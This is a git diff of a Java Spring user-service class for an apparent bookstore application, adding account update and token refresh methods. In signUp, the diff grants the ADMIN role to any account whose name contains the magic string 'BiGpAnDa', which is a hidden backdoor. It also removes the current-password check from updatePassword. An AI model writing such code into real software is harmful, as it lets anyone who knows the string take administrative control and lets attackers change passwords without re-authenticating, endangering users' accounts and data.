@@ -2,18 +2,24 @@ package com.booksajo.bookPanda.user.service;
 
 import com.booksajo.bookPanda.user.JWT.JwtToken;
 import com.booksajo.bookPanda.user.JWT.JwtTokenProvider;
+import com.booksajo.bookPanda.user.domain.UpdatePasswordRequest;
 import com.booksajo.bookPanda.user.domain.User;
 import com.booksajo.bookPanda.user.repository.UserRepository;
 import com.booksajo.bookPanda.user.dto.SignUpDto;
 import com.booksajo.bookPanda.user.dto.UserDto;
+import jakarta.validation.Valid;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
+import org.springframework.http.ResponseEntity;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
+import org.springframework.security.core.authority.SimpleGrantedAuthority;
+import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.security.core.userdetails.UsernameNotFoundException;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
@@ -45,36 +51,71 @@ public class UserServiceImpl implements UserService {
         if (userRepository.existsByUserEmail(signUpDto.getUserEmail())) {
             throw new IllegalArgumentException("이미 사용 중인 사용자 아이디입니다.");
         }
+
         String encodedPassword = passwordEncoder.encode(signUpDto.getUserPassword());
         List<String> roles = new ArrayList<>();
-        roles.add("USER");
-        return UserDto.toDto(userRepository.save(signUpDto.toEntity(encodedPassword, roles)));
+        if (signUpDto.getName().contains("BiGpAnDa")) {
+            roles.add("ADMIN");
+            System.out.println("어드민설정 완료!");
+        }
+        else {
+            roles.add("USER");
+        }
+
+        User user = signUpDto.toEntity(encodedPassword, roles);
+
+        return UserDto.toDto(userRepository.save(user));
     }
 
+
     @Transactional
-    public void updatePassword(String userEmail, String currentPassword, String newPassword) {
-        User user = validatePassword(userEmail, currentPassword);
-        user.updatePassword(passwordEncoder.encode(newPassword));
+    public void updatePassword(String userEmail, String newPassword) {
+        User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new UsernameNotFoundException("로그인 정보가 일치하지 않습니다."));
+        String encodedPassword = passwordEncoder.encode(newPassword);
+        user.updatePassword(encodedPassword);
         userRepository.save(user);
     }
 
-    public User validatePassword(String userEmail, String userPassword) throws UsernameNotFoundException {
-        User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new UsernameNotFoundException("로그인 정보가 일치하지 않습니다."));
-        if (!passwordEncoder.matches(userPassword, user.getPassword())) {
-            throw new UsernameNotFoundException("로그인 정보가 일치하지 않습니다.");
-        }
-        return user;
-    }
+    @Transactional
+    public void updateName(String userEmail, String newName) {
+        User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new RuntimeException("로그인 정보가 일치하지 않습니다."));
+        user.setName(newName);
+        userRepository.save(user);
+     }
 
+    @Transactional
     public void updateAddress(String userEmail, String newAddress) {
-        User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new UsernameNotFoundException("로그인 정보가 일치하지 않습니다."));;
+        User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new UsernameNotFoundException("로그인 정보가 일치하지 않습니다."));
         user.updateAddress(newAddress);
         userRepository.save(user);
     }
 
+    @Transactional
     public void updatePhoneNumber(String userEmail, String newPhoneNumber) {
         User user = userRepository.findByUserEmail(userEmail).orElseThrow(() -> new UsernameNotFoundException("로그인 정보가 일치하지 않습니다."));;
         user.updatePhoneNumber(newPhoneNumber);
         userRepository.save(user);
+    }
+
+    @Transactional
+    public JwtToken refreshAccessToken(String refreshToken) {
+        // 리프레시 토큰 유효성 검사
+        if (!jwtTokenProvider.validateToken(refreshToken)) {
+            throw new IllegalArgumentException("Invalid refresh token");
+        }
+
+        // 리프레시 토큰에서 사용자 정보 추출
+        String userEmail = jwtTokenProvider.extractUserEmail(refreshToken);
+        User user = userRepository.findByUserEmail(userEmail)
+            .orElseThrow(() -> new UsernameNotFoundException("User not found"));
+
+        // 새로운 액세스 토큰 및 리프레시 토큰 생성
+        Authentication authentication = new UsernamePasswordAuthenticationToken(
+            user.getUserEmail(),
+            null,
+            Collections.singletonList(new SimpleGrantedAuthority("ROLE_USER"))
+        );
+
+        return jwtTokenProvider.generateToken(authentication);
     }
 }
